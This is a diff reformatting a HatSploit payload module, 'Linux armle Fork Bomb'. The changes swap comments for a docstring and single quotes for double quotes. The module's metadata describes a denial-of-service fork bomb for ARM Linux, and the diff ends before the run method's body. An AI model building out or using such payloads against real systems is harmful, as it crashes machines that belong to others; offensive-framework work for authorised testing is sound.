@@ -1,23 +1,21 @@
-#!/usr/bin/env python3
-
-#
-# This payload requires HatSploit: https://hatsploit.com
-# Current source: https://github.com/EntySec/HatSploit
-#
+"""
+This payload requires HatSploit: https://hatsploit.com
+Current source: https://github.com/EntySec/HatSploit
+"""
 
 from hatsploit.lib.payload import Payload
 
 
 class HatSploitPayload(Payload):
     details = {
-        'Name': "Linux armle Fork Bomb",
-        'Payload': "linux/armle/fork_bomb",
-        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
-        'Description': "Fork bomb payload for Linux armle.",
-        'Architecture': "armle",
-        'Platform': "linux",
-        'Rank': "low",
-        'Type': "one_side",
+        "Name": "Linux armle Fork Bomb",
+        "Payload": "linux/armle/fork_bomb",
+        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
+        "Description": "Fork bomb payload for Linux armle.",
+        "Architecture": "armle",
+        "Platform": "linux",
+        "Rank": "low",
+        "Type": "one_side",
     }
 
     def run(self):
